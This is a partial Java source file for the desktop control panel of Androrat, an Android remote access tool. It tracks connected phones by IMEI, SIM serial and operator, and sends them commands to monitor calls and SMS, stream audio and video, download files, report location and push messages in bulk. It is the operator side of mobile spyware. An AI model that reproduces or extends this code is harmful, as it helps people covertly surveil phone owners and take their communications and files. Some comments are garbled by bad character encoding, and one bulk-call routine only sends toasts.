...
public class GUI extends javax.swing.JFrame {
	...
	private void buttonAboutActionPerformed() {
		JOptionPane.showMessageDialog(this,
				"Androrat is a free application developped in Java language.\n"
						+ "Autors : A.Bertrand, R.David, A.Akimov & P.Junk\n"
						+ "It is under the GNU GPL3 Licence", "About Androrat",
	 ...
	 * 
	 * @param imei
	 *            L'identifiant t�l�phone
	 * @param countryCode
	 *            Le code du pays o� se trouve l'appareil
	 * @param telNumber
	 *            Le numero de t�l�phone (si disponible) de l'appareil
	 * @param simCountryCode
	 *            Le pays d'enregitrement de la SIM
	 * @param simSerial
	 *            Le s�rial de la SIM
	 * @param operator
	 *            L'op�rateur o� se trouve l'appareil
	 * @param simOperator
	 *            L'op�rateur de la carte SIM
	 */
	/*
	 * public void addUser(String imei, String countryCode, String telNumber,
	 * String simCountryCode, String simSerial, String operator, String
	 * simOperator) { if(countryCode == null) countryCode = "/"; if(telNumber ==
	 * null) telNumber = "/"; if(simCountryCode == null) simCountryCode = "/";
	 * if(simOperator == null) simOperator = "/"; if(simSerial == null)
	 * simSerial = "/"; if(operator == null) operator = "/"; model.addUser(new
	 * User(imei, countryCode, telNumber, operator, simCountryCode, simOperator,
	 * simSerial)); }
	 */

	public void addUser(String imei, String countryCode, String telNumber,
			String simCountryCode, String simSerial, String operator,
			String simOperator) {
		...
		model.addUser(new User(countryCode, imei, countryCode, telNumber,
				operator, simCountryCode, simOperator, simSerial));
	}
	...
	public class MyRenderer extends DefaultTableCellRenderer {
		...
		public Component getTableCellRendererComponent(JTable table,
			...
			ImageIcon getImg;
			// country = "fr";
			File f = new File("src/gui/res/Drapeau/" + country.toUpperCase()
					+ ".png");
			if (f.exists()) {
				getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(
						UserGUI.class.getResource("/gui/res/Drapeau/"
								+ country.toUpperCase() + ".png")));
			} else
				getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(
						UserGUI.class
								.getResource("/gui/res/Drapeau/default.jpeg")));
	 ...
	 * 
	 * @param imei
	 *            L'identifiant du client � supprimer
	 */
	public void deleteUser(String imei) {
		...
		if (gui != null) {
			if (gui.isVisible())
				gui.launchMessageDialog(
						"This client is no longer available.\nClosing frame now ...",
						"Disconnection", JOptionPane.ERROR_MESSAGE);
			gui.dispose();
		}
		guiMap.remove(imei);
	...
	/**
	 * M�thode appel�e par les UserGUI lors de leur fermeture afin de
	 * supprimer la r�f�rence dans la HashMap
	 * 
	 * @param imei
	...
	public void updateAdvInformations(String imei,
			AdvancedInformationPacket packet) {
		UserGUI user = guiMap.get(imei);
		user.updateHomeInformations(packet);
	}

	public void updatePreference(String imei, String ip, int port,
			boolean wait, ArrayList<String> phones, ArrayList<String> sms,
			ArrayList<String> kw) {
		UserGUI user = guiMap.get(imei);
		user.updatePreference(ip, port, wait, phones, sms, kw);
	}

	public void updateUserMap(String imei, double lon, double lat, double alt,
	...
	public void fireStopSoundStreaming(String imei, int channel) {
		server.commandStopSender(imei, Protocol.STOP_SOUND_STREAM, null,
				channel);
	}
	...
	public void fireStopVideoStream(String imei, int channel) {
		server.commandStopSender(imei, Protocol.STOP_VIDEO_STREAM, null,
				channel);
	}
	...
	public void fireFileDownload(String imei, String path, String downPath,
			String downName) {
		server.commandFileSender(imei, Protocol.GET_FILE, path.getBytes(),
				downPath, downName);
	}
	...
	public void fireVibrate(String imei, Long duration) {
		server.commandSender(imei, Protocol.DO_VIBRATE,
				EncoderHelper.encodeLong(duration));
	}
	...
	public void fireStartCallMonitoring(String imei,
			HashSet<String> phoneNumbers) {
		server.commandSender(imei, Protocol.MONITOR_CALL,
				EncoderHelper.encodeHashSet(phoneNumbers));
	}

	public void fireStopCallMonitoring(String imei, int channel) {
		server.commandStopSender(imei, Protocol.STOP_MONITOR_CALL, null,
				channel);
	}

	public void fireStartSMSMonitoring(String imei, HashSet<String> phoneNumbers) {
		server.commandSender(imei, Protocol.MONITOR_SMS,
				EncoderHelper.encodeHashSet(phoneNumbers));
	}
	...
	public void fireSaveConnectConfiguration(String imei, String ip, int port,
			boolean wait, ArrayList<String> phones, ArrayList<String> sms,
			ArrayList<String> kw) {
		PreferencePacket pp = new PreferencePacket(ip, port, wait, phones, sms,
				kw);
	...
	private void fireBulkToast() {
		...
		if (txt != null) {
			for (int row = 0; row < userTable.getRowCount(); row++) {
				String imei = (String) model.getValueAt(row, 1);
				if (imei != null)
					this.fireToastMessage(imei, txt);
			}
		}
	}
	...
	private void fireBulkCall() {
		String target = JOptionPane.showInputDialog(this,
				"Enter the target cell number :");
		if (target != null) {
			for (int row = 0; row < userTable.getRowCount(); row++) {
				String imei = (String) model.getValueAt(row, 1);
				if (imei != null)
					this.fireToastMessage(imei, target);
			}
		}
	}
	...
	private void fireSelectPort() {
		String rep = JOptionPane.showInputDialog(this,
				"Enter the new server port (need server reboot) : ");
	...
	/**
	 * Fonction g�n�rant les �l�ments SWING de l'interface graphique NE
	 * PAS TOUCHER !!
	 */
	private void initComponents() {
		...
		try {
			image = ImageIO.read(this.getClass().getResource(
					"/gui/res/androrat_logo_32pix.png"));
		} catch (IOException e) {
			e.printStackTrace();
		}
		...
		buttonUserGUI.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_U,
		...
		buttonRemoveUser.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_R,
				InputEvent.CTRL_MASK));
